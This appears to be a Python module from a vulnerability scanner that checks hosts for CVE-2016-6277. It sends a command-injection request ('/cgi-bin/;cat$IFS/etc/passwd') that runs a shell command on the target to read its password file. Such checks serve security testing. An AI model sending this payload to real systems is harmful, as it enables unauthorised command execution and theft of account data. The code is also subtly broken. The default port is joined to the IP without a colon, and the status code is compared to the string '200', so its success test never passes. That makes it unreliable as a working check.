import requests
from intrack.lib.headers.headers_handler import user_agents
from intrack.lib.color_handler import print_colour

def check_CVE_2016_6277(ip, ports=None, timeout=5):
	protocols = ["http", "https"]
	if ports is None:
		ports = [80]
	else:
		ports = [f":{port}" for port in ports]

	for protocol in protocols:
		for port in ports:
			url = f"{protocol}://{ip}{port}/cgi-bin/;cat$IFS/etc/passwd"
			headers = {
				'User-Agent': user_agents()
			}
			try:
				response = requests.get(url, headers=headers, timeout=timeout, verify=False)
				if "root:" in response.text and response.status_code == "200":
					print_colour(f"The target is vulnerable to CVE-2016-6277 : {url}")
					return True
			except requests.RequestException:
				continue 
	return False